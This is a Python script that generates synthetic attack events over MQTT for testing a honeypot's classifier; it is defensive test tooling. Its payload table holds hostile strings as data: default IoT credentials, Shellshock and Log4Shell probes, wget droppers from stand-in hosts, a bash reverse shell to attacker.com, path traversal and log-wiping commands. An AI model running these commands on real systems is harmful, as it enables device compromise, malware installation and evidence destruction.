#!/usr/bin/env python3
"""
simulate_attacks.py — synthetic attack event generator for the ESP32 honeypot pipeline.

Phase 1: auth attempts, commands, HTTP traversal, SSH grabs, MQTT publishes
Phase 2: --patterns flag emits all 47 pattern types with correct classifier fields

Usage:
    python simulate_attacks.py --broker localhost --port 1883
    python simulate_attacks.py --broker localhost --port 1883 --patterns --sessions 3
    python simulate_attacks.py --broker localhost --port 1883 --duration 120
"""
import argparse
import json
import random
import string
import time
from datetime import datetime, timezone

import paho.mqtt.client as mqtt

# ── Attack data ───────────────────────────────────────────────────────────────

MIRAI_CREDS = [
    ("root","xc3511"),("root","vizxv"),("root","888888"),("root","default"),
    ("root","root"),("admin","admin"),("admin","1234"),("admin","password"),
    ("admin",""),("root",""),("root","12345"),("root","pass"),
    ("root","admin"),("Admin","Admin"),("supervisor",""),
]

ATTACKER_IPS = (
    ["185.220.101.{}".format(i) for i in range(1, 20)]
    + ["45.33.{}.{}".format(random.randint(1,254), random.randint(1,254))
       for _ in range(10)]
)

MQTT_TOPICS = {
    "auth":      "honeypot/events/auth",
    "connect":   "honeypot/events/connect",
    "command":   "honeypot/events/command",
    "exploit":   "honeypot/events/exploit",
    "heartbeat": "honeypot/events/heartbeat",
}

NODE_ID = "sim-node-01"


# ── 47-pattern taxonomy ───────────────────────────────────────────────────────

PATTERNS = [
    ( 1, "MIRAI_DEFAULT_CREDS",    "A", "Mirai",        "T1110.001"),
    ( 2, "MIRAI_ADMIN_SWEEP",      "A", "Mirai",        "T1110.001"),
    ( 3, "MOZI_ROUTER_CREDS",      "A", "Mozi",         "T1110.001"),
    ( 4, "HAJIME_SLOW_BRUTE",      "A", "Hajime",       "T1110.001"),
    ( 5, "CONTROL4_TARGETED",      "A", "Control4",     "T1110.001"),
    ( 6, "GAFGYT_DEFAULT",         "A", "Gafgyt",       "T1110.001"),
    ( 7, "SATORI_HUAWEI",          "A", "Satori",       "T1110.001"),
    ( 8, "FBOT_FBXROUTER",         "A", "FBot",         "T1110.001"),
    ( 9, "GENERIC_DICT_FAST",      "A", "Generic",      "T1110.001"),
    (10, "CREDENTIAL_STUFFING",    "A", "Generic",      "T1110.001"),
    (11, "SINGLE_SHOT_DEFAULT",    "A", "Generic",      "T1110.001"),
    (12, "SUBNET_COORDINATED",     "A", "Coordinated",  "T1110.001"),
    (13, "PORT_SCAN_SEQUENTIAL",   "B", "Masscan",      "T1046"),
    (14, "BANNER_GRAB_ONLY",       "B", "Shodan",       "T1046"),
    (15, "HTTP_FINGERPRINT",       "B", "Generic",      "T1046"),
    (16, "CGI_PROBE",              "B", "Generic",      "T1203"),
    (17, "MQTT_TOPIC_ENUM",        "B", "Generic",      "T1046"),
    (18, "UPNP_PROBE",             "B", "Generic",      "T1046"),
    (19, "MITRE_T1046_NETSCAN",    "B", "Generic",      "T1046"),
    (20, "SLOW_RECON",             "B", "APT",          "T1046"),
    (21, "SHELLSHOCK",             "C", "Generic",      "T1059"),
    (22, "DASAN_RCE",              "C", "Generic",      "T1203"),
    (23, "HUAWEI_HG532_RCE",       "C", "Generic",      "T1203"),
    (24, "REALTEK_SDK_RCE",        "C", "Generic",      "T1203"),
    (25, "BUFFER_OVERFLOW_TELNET", "C", "Generic",      "T1203"),
    (26, "DIR_TRAVERSAL_HTTP",     "C", "Generic",      "T1083"),
    (27, "COMMAND_INJECTION_HTTP", "C", "Generic",      "T1059.004"),
    (28, "MQTT_MALICIOUS_PUBLISH", "C", "Generic",      "T1499"),
    (29, "LOG4SHELL_PROBE",        "C", "Generic",      "T1203"),
    (30, "SPRING4SHELL_PROBE",     "C", "Generic",      "T1203"),
    (31, "WGET_DROPPER",           "D", "Mirai",        "T1105"),
    (32, "BUSYBOX_WGET_CHAIN",     "D", "Satori",       "T1105"),
    (33, "CHMOD_EXECUTE",          "D", "Generic",      "T1059"),
    (34, "CRONTAB_PERSISTENCE",    "D", "APT",          "T1053"),
    (35, "IPTABLES_MANIPULATION",  "D", "Generic",      "T1562"),
    (36, "CRYPTO_MINER_INSTALL",   "D", "Cryptojacker", "T1496"),
    (37, "C2_CALLBACK_ATTEMPT",    "D", "APT",          "T1059"),
    (38, "SELF_PROPAGATION",       "D", "Worm",         "T1210"),
    (39, "LOG_WIPE",               "D", "APT",          "T1070"),
    (40, "HAWKES_BURST_A",         "E", "Generic",      "T1498"),
    (41, "HAWKES_BURST_B",         "E", "Generic",      "T1498"),
    (42, "HAWKES_PERIODIC",        "E", "Generic",      "T1498"),
    (43, "DIURNAL_NIGHT",          "E", "Generic",      "T1498"),
    (44, "MULTI_PROTOCOL_CHAIN",   "E", "Generic",      "T1046"),
    (45, "TLS_DOWNGRADE",          "E", "Generic",      "T1562"),
    (46, "MQTT_QOS_ABUSE",         "E", "Generic",      "T1499"),
    (47, "ZERO_DAY_ANOMALY",       "E", "Unknown",      "T1203"),
]

# Template payloads that trigger each pattern in the heuristic classifier
PATTERN_PAYLOADS = {
    1:  {"user": "root",  "pass": "xc3511",       "proto": "telnet", "evt": "auth_attempt", "attempt_count": 2},
    2:  {"user": "admin", "pass": "admin",         "proto": "telnet", "evt": "auth_attempt", "attempt_count": 3},
    3:  {"user": "root",  "pass": "root",          "proto": "telnet", "evt": "auth_attempt"},
    4:  {"user": "root",  "pass": "toor",          "proto": "ssh",    "evt": "auth_attempt", "session_dur_ms": 35000},
    5:  {"user": "root",  "pass": "t0talc0ntr0l4!","proto": "telnet", "evt": "auth_attempt"},
    6:  {"user": "root",  "pass": "888888",        "proto": "telnet", "evt": "auth_attempt", "session_dur_ms": 300},
    7:  {"user": "root",  "pass": "Zte521",        "proto": "telnet", "evt": "auth_attempt"},
    8:  {"user": "supervisor","pass":"zyad1234",   "proto": "telnet", "evt": "auth_attempt"},
    9:  {"user": "admin", "pass": "wrongpw",       "proto": "telnet", "evt": "auth_attempt", "attempt_count": 15, "session_dur_ms": 45000},
    10: {"user": "user1", "pass": "P@ssw0rd",      "proto": "http",   "evt": "auth_attempt", "cmd": "POST /login base64 application/json"},
    11: {"user": "admin", "pass": "admin",         "proto": "telnet", "evt": "auth_attempt", "attempt_count": 1},
    12: {"user": "root",  "pass": "admin",         "proto": "telnet", "evt": "auth_attempt"},
    13: {"user": "",      "pass": "",              "proto": "tcp",    "evt": "connect",  "cmd": "port_scan"},
    14: {"user": "",      "pass": "",              "proto": "telnet", "evt": "connect",  "cmd": ""},
    15: {"user": "",      "pass": "",              "proto": "http",   "evt": "connect",  "cmd": "HEAD /"},
    16: {"user": "",      "pass": "",              "proto": "http",   "evt": "exploit",  "cmd": "GET /cgi-bin/admin.cgi"},
    17: {"user": "",      "pass": "",              "proto": "mqtt",   "evt": "connect",  "cmd": "SUBSCRIBE #"},
    18: {"user": "",      "pass": "",              "proto": "http",   "evt": "connect",  "cmd": "GET /description.xml"},
    19: {"user": "",      "pass": "",              "proto": "tcp",    "evt": "connect",  "cmd": "SYN_scan"},
    20: {"user": "",      "pass": "",              "proto": "tcp",    "evt": "connect",  "cmd": "slow_recon"},
    21: {"user": "",      "pass": "",              "proto": "http",   "evt": "exploit",  "cmd": "() { :;}; echo shellshock"},
    22: {"user": "",      "pass": "",              "proto": "http",   "evt": "exploit",  "cmd": "GET /GponForm/diag_Form?cmd=id"},
    23: {"user": "",      "pass": "",              "proto": "http",   "evt": "exploit",  "cmd": "POST /ctrlt/DeviceUpgrade_1 NewStatusURL=http://evil.com"},
    24: {"user": "",      "pass": "",              "proto": "http",   "evt": "exploit",  "cmd": "POST /soap.cgi SUBSCRIBE shell:/bin/sh"},
    25: {"user": "",      "pass": "A"*260,         "proto": "telnet", "evt": "exploit",  "input_max_len": 300},
    26: {"user": "",      "pass": "",              "proto": "http",   "evt": "exploit",  "cmd": "GET /../../../etc/passwd"},
    27: {"user": "",      "pass": "",              "proto": "http",   "evt": "exploit",  "cmd": "GET /search?q=hello;bash"},
    28: {"user": "",      "pass": "",              "proto": "mqtt",   "evt": "exploit",  "cmd": "PUBLISH cmnd/tasmota/power on"},
    29: {"user": "",      "pass": "",              "proto": "http",   "evt": "exploit",  "cmd": "${jndi:ldap://attacker.com/a}"},
    30: {"user": "",      "pass": "",              "proto": "http",   "evt": "exploit",  "cmd": "POST class.module.classLoader.URLs[0]=jar:file:///tmp/s.jar"},
    31: {"user": "root",  "pass": "root",          "proto": "telnet", "evt": "command",  "cmd": "wget http://malware.cc/bot.sh"},
    32: {"user": "root",  "pass": "root",          "proto": "telnet", "evt": "command",  "cmd": "/bin/busybox wget http://evil.com/SATORI"},
    33: {"user": "root",  "pass": "root",          "proto": "telnet", "evt": "command",  "cmd": "chmod +x bot && ./bot"},
    34: {"user": "root",  "pass": "root",          "proto": "telnet", "evt": "command",  "cmd": "crontab -e"},
    35: {"user": "root",  "pass": "root",          "proto": "telnet", "evt": "command",  "cmd": "iptables -F"},
    36: {"user": "root",  "pass": "root",          "proto": "telnet", "evt": "command",  "cmd": "wget http://pool.supportxmr.com/xmrig"},
    37: {"user": "root",  "pass": "root",          "proto": "telnet", "evt": "command",  "cmd": "bash -i >& /dev/tcp/attacker.com/4444 0>&1"},
    38: {"user": "root",  "pass": "root",          "proto": "telnet", "evt": "command",  "cmd": "for ip in $(seq 1 254); do telnet 192.168.1.$ip; done"},
    39: {"user": "root",  "pass": "root",          "proto": "telnet", "evt": "command",  "cmd": "history -c && rm /var/log/auth.log"},
    40: {"user": "root",  "pass": "root",          "proto": "telnet", "evt": "auth_attempt", "confidence": 80},
    41: {"user": "root",  "pass": "root",          "proto": "telnet", "evt": "auth_attempt", "confidence": 75},
    42: {"user": "root",  "pass": "root",          "proto": "telnet", "evt": "auth_attempt", "confidence": 88},
    43: {"user": "root",  "pass": "root",          "proto": "telnet", "evt": "auth_attempt", "confidence": 70},
    44: {"user": "",      "pass": "",              "proto": "http",   "evt": "connect",      "confidence": 82},
    45: {"user": "",      "pass": "",              "proto": "ssh",    "evt": "connect",      "confidence": 78},
    46: {"user": "",      "pass": "",              "proto": "mqtt",   "evt": "exploit",  "cmd": "PUBLISH QoS2 rapid", "confidence": 85},
    47: {"user": "x",     "pass": "x"*60,          "proto": "telnet", "evt": "auth_attempt", "confidence": 62},
}


def _session_id() -> str:
    return "".join(random.choices("0123456789abcdef", k=6))


def _ts() -> int:
    return int(datetime.now(timezone.utc).timestamp())


def _make_event(template: dict, src_ip: str) -> dict:
    return {
        "ts":              _ts(),
        "proto":           template.get("proto", "telnet"),
        "src_ip":          src_ip,
        "user":            template.get("user", ""),
        "pass":            template.get("pass", ""),
        "cmd":             template.get("cmd", ""),
        "evt":             template.get("evt", "auth_attempt"),
        "node":            NODE_ID,
        "session_id":      _session_id(),
        "attempt_num":     template.get("attempt_count", 1),
        "session_dur_ms":  template.get("session_dur_ms", random.randint(200, 5000)),
        "input_max_len":   template.get("input_max_len", len(str(template.get("pass","")))),
        "pattern_id":      template.get("pattern_id", 0),
        "pattern_name":    template.get("pattern_name", ""),
        "confidence":      template.get("confidence", 0),
        "botnet_family":   template.get("botnet_family", ""),
        "mitre_technique": template.get("mitre_technique", ""),
    }


def _topic_for_event(ev: dict) -> str:
    mapping = {
        "auth_attempt": "auth",
        "auth_success": "auth",
        "connect":      "connect",
        "command":      "command",
        "exploit":      "exploit",
        "heartbeat":    "heartbeat",
    }
    return MQTT_TOPICS[mapping.get(ev.get("evt",""), "command")]


def publish(client: mqtt.Client, ev: dict) -> None:
    topic   = _topic_for_event(ev)
    payload = json.dumps(ev, separators=(",", ":"))
    res     = client.publish(topic, payload, qos=0)
    res.wait_for_publish(timeout=3)
    print(f"  [{ev['evt']:20s}] {topic.split('/')[-1]:10s} | "
          f"src={ev['src_ip']:<20s} pid={ev.get('pattern_id',0):2d}")


# ── Simulation modes ──────────────────────────────────────────────────────────

def run_phase1(client: mqtt.Client, count: int) -> None:
    print(f"\n=== Phase 1 ({count} auth rounds) ===")

    for _ in range(count):
        ip = random.choice(ATTACKER_IPS)
        user, pw = random.choice(MIRAI_CREDS)
        ev = _make_event({"user": user, "pass": pw, "proto": "telnet", "evt": "auth_attempt"}, ip)
        publish(client, ev)
        time.sleep(0.05)

    for _ in range(min(10, count // 5)):
        ip = random.choice(ATTACKER_IPS)
        user, pw = random.choice(MIRAI_CREDS[:5])
        for evtype, cmd in [("auth_attempt",""), ("auth_success",""),
                             ("command","id"), ("command","uname -a"),
                             ("command","wget http://malware.example.com/bot.sh")]:
            ev = _make_event({"user": user, "pass": pw if "auth" in evtype else "",
                               "proto": "telnet", "evt": evtype, "cmd": cmd}, ip)
            publish(client, ev)
            time.sleep(0.1)

    for _ in range(5):
        ev = _make_event({"proto": "http", "evt": "exploit",
                          "cmd": "GET /../../../etc/passwd"}, random.choice(ATTACKER_IPS))
        publish(client, ev)

    for _ in range(3):
        ev = _make_event({"proto": "ssh", "evt": "connect",
                          "cmd": "SSH-2.0-libssh2_1.10.0"}, random.choice(ATTACKER_IPS))
        publish(client, ev)

    for _ in range(2):
        ev = _make_event({"proto": "mqtt", "evt": "exploit",
                          "cmd": "PUBLISH cmnd/tasmota/power 1"}, random.choice(ATTACKER_IPS))
        publish(client, ev)

    print("Phase 1 done.")


def run_all_patterns(client: mqtt.Client, sessions_per_pattern: int) -> None:
    print(f"\n=== Phase 2 — all 47 patterns ({sessions_per_pattern} sessions each) ===")
    for pid, pname, group, botnet, mitre in PATTERNS:
        base = PATTERN_PAYLOADS.get(pid, {"proto": "telnet", "evt": "auth_attempt"}).copy()
        base["pattern_id"]      = pid
        base["pattern_name"]    = pname
        base["botnet_family"]   = botnet
        base["mitre_technique"] = mitre
        if "confidence" not in base:
            base["confidence"] = random.randint(65, 98)
        for _ in range(sessions_per_pattern):
            ev = _make_event(base, random.choice(ATTACKER_IPS))
            ev["pattern_id"]      = pid
            ev["pattern_name"]    = pname
            ev["botnet_family"]   = botnet
            ev["mitre_technique"] = mitre
            publish(client, ev)
            time.sleep(0.02)
    print("All 47 patterns emitted.")


def run_heartbeats(client: mqtt.Client, duration_s: int, interval_s: int = 30) -> None:
    print(f"\n=== Heartbeats for {duration_s}s (every {interval_s}s) ===")
    deadline = time.time() + duration_s
    while time.time() < deadline:
        ev = {
            "ts":        _ts(),
            "proto":     "internal",
            "src_ip":    "0.0.0.0",
            "user":      "",
            "pass":      "",
            "cmd":       "",
            "evt":       "heartbeat",
            "node":      NODE_ID,
            "free_heap": random.randint(180000, 280000),
            "uptime_s":  random.randint(3600, 86400),
        }
        res = client.publish(MQTT_TOPICS["heartbeat"], json.dumps(ev), qos=0)
        res.wait_for_publish(timeout=3)
        print(f"  [heartbeat] free_heap={ev['free_heap']} uptime={ev['uptime_s']}s")
        time.sleep(interval_s)


# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="Honeypot attack simulator")
    parser.add_argument("--broker",   default="localhost")
    parser.add_argument("--port",     type=int, default=1883)
    parser.add_argument("--count",    type=int, default=50,
                        help="Auth attempts for phase 1")
    parser.add_argument("--patterns", action="store_true",
                        help="Emit all 47 patterns (phase 2)")
    parser.add_argument("--sessions", type=int, default=3,
                        help="Sessions per pattern (used with --patterns)")
    parser.add_argument("--duration", type=int, default=0,
                        help="Send heartbeats for N seconds after events")
    args = parser.parse_args()

    c = mqtt.Client(client_id="sim-" + _session_id())
    c.connect(args.broker, args.port, keepalive=60)
    c.loop_start()
    print(f"Connected to {args.broker}:{args.port}")

    try:
        run_phase1(c, args.count)
        if args.patterns:
            run_all_patterns(c, args.sessions)
        if args.duration > 0:
            run_heartbeats(c, args.duration)
    finally:
        c.loop_stop()
        c.disconnect()
        print("\nSimulation complete.")


if __name__ == "__main__":
    main()
